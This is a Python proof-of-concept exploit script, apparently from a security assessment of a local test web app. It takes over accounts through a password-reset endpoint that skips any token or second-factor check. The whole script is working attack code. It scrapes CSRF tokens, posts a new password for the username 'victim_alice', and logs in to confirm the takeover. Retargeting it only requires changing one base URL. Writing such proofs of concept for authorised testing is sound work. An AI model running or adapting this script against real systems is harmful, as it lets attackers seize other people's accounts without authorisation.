"""
POC 1: Account Takeover via POST /forgot-password
Target: http://127.0.0.1:5000/forgot-password

Vulnerability:
The /forgot-password endpoint accepts username and new_password via POST and directly
updates the database record without validating an email token, SMS code, previous
password, or two-factor authentication challenge.
"""

import http.cookiejar
import re
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:5000"

def run_poc(target_username="victim_alice", new_password="NewUntrustedPassword999!"):
    print(f"[*] Targeting username: '{target_username}'")
    cj = http.cookiejar.CookieJar(policy=http.cookiejar.DefaultCookiePolicy(secure_protocols=("https", "http")))
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Step 1: Fetch CSRF token from /forgot-password
    get_req = urllib.request.Request(f"{BASE_URL}/forgot-password")
    resp = opener.open(get_req)
    html = resp.read().decode("utf-8")
    csrf_token = re.search(r'name="csrf_token"\s+value="([^"]+)"', html).group(1)
    print(f"[+] Retrieved CSRF Token: {csrf_token[:25]}...")

    # Step 2: Send unauthenticated POST to reset the target's password
    payload = urllib.parse.urlencode({
        "csrf_token": csrf_token,
        "username": target_username,
        "new_password": new_password,
    }).encode("utf-8")

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            return fp

    post_opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj), NoRedirect()
    )
    post_req = urllib.request.Request(
        f"{BASE_URL}/forgot-password",
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    post_resp = post_opener.open(post_req)
    print(f"[+] POST /forgot-password Response Status: {post_resp.status}")
    print(f"[+] Redirect Location: {post_resp.headers.get('Location')}")

    # Step 3: Verify the account can now be accessed using new_password
    login_get = opener.open(f"{BASE_URL}/login")
    login_csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', login_get.read().decode("utf-8")).group(1)
    login_payload = urllib.parse.urlencode({
        "csrf_token": login_csrf,
        "username": target_username,
        "password": new_password,
    }).encode("utf-8")
    login_req = urllib.request.Request(
        f"{BASE_URL}/loginsubmit",
        data=login_payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    login_resp = post_opener.open(login_req)
    print(f"[+] Login Verification Status: {login_resp.status}")
    print(f"[+] Login Redirect: {login_resp.headers.get('Location')}")

    if login_resp.headers.get("Location", "").endswith("/verify-otp"):
        print("[!] EXPLOIT CONFIRMED: Password successfully overwritten without authorization!")
    else:
        print("[-] Exploit failed or account not found.")

if __name__ == "__main__":
    run_poc()
